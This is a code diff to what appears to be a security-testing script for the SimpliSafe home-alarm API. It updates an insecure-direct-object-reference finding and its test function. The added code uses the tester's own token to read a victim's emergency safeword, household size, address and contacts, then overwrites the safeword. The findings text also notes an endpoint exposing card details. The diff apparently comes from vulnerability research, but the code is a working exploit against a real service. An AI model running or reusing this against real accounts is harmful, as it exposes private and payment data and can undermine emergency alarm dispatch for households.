@@ -327,8 +327,14 @@ FINDINGS = [
                   '    -> attacker confirms/cancels dispatch, learns alarm details, impersonates homeowner. '
                   '(4) Change numAdults/numChildren: affects monitoring center threat assessment. '
                   'ALSO: GET /subscriptions/{sid}/settings?settingsType=GENERAL may expose current safeWord (F25-family). '
-                  'Test: POST /activation/{victim_userId}/{victim_sid}/location with modified safeWord; '
-                  '200 = CRITICAL.'),
+                  'PRIMARY read path: GET /locations/{locationId}/all -> LocationDetails{'
+                  'location: LocationInfo{dispatcherInfo: DispatcherInfo{safeWord, numAdults, numChildren, lStatus}}}'
+                  ' (SimpliSafeRestService.java:157, classes14.dex). locationId = sid in most contexts. '
+                  'SECONDARY read path: GET /ss3/subscriptions/{sid}/settings?settingsType=GENERAL. '
+                  'Test: GET /locations/{victim_locationId}/all with own token; 200+safeWord = read CRITICAL. '
+                  'POST /activation/{victim_userId}/{victim_sid}/location {"safeWord":"X"}; 200 = write CRITICAL. '
+                  'Note: GET /accounts/{userId}/locations/billing also returns per-location paymentMethodId + '
+                  'CreditCard{cardBrand, lastFour, expirationMonth, expirationYear} (overlaps F32 read surface).'),
 ]
 
 
@@ -1006,23 +1012,41 @@ def test_monitoring_feature_idor(token, victim_location_id):
         _print("INFO", r.status_code, f"features/{victim_location_id}: {r.text[:100]}")
 
 
-def test_location_settings_idor(token, victim_uid, victim_sid, attacker_safeword="ABLATION-PROBE-1234"):
-    """F35: Change victim's emergency safeword + contacts via location settings IDOR."""
-    print(f"\n=== F35 — Location Settings IDOR (uid={victim_uid}, sid={victim_sid}) ===")
-    # Step 1: probe GET to read current safeWord (via subscriptions settings endpoint)
+def test_location_settings_idor(token, victim_uid, victim_sid, victim_location_id=None,
+                               attacker_safeword="ABLATION-PROBE-1234"):
+    """F35: Read safeWord via GET locations/{locationId}/all + change it via POST activation."""
+    print(f"\n=== F35 — Emergency Dispatch IDOR (uid={victim_uid}, sid={victim_sid}) ===")
+    # Step 1a: primary read path — GET /locations/{locationId}/all (locationId = victim_sid or locationId)
+    loc_id = victim_location_id or victim_sid
+    r = get(f"{SERVICES['yoda']}/locations/{loc_id}/all", token=token)
+    if r and r.status_code == 200:
+        try:
+            data = r.json()
+            loc = data.get("location", data)
+            di = loc.get("dispatcherInfo", {})
+            sw = di.get("safeWord")
+            contacts = loc.get("contacts", {})
+            addr = loc.get("address", {})
+            _print("CRIT", 200,
+                   f"LOCATION ALL locationId={loc_id} safeWord={sw} "
+                   f"numAdults={di.get('numAdults')} "
+                   f"street={addr.get('street1','?')} contacts={contacts}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code if r else 0,
+               f"locations/{loc_id}/all: {r.text[:80] if r else 'no response'}")
+    # Step 1b: fallback read — subscription settings
     r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/settings?settingsType=GENERAL",
             token=token)
     if r and r.status_code == 200:
         try:
             data = r.json()
             sw = data.get("settings", {}).get("safeWord") or data.get("safeWord")
-            _print("CRIT", 200, f"SAFEWORD READ sid={victim_sid} safeWord={sw}")
+            _print("CRIT", 200, f"SAFEWORD READ (settings) sid={victim_sid} safeWord={sw}")
         except Exception as e:
-            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:150]}")
-    else:
-        _print("INFO", r.status_code if r else 0,
-               f"settings read: {r.text[:80] if r else 'no response'}")
-    # Step 2: safe probe — only modifies safeWord, leaves other fields empty to minimize blast radius
+            _print("CRIT", 200, f"200 (parse err: {e})")
+    # Step 2: write probe — only modifies safeWord
     body = {"safeWord": attacker_safeword}
     r2 = post(f"{SERVICES['yoda']}/activation/{victim_uid}/{victim_sid}/location",
               token=token, params={"country": "US"}, json=body)
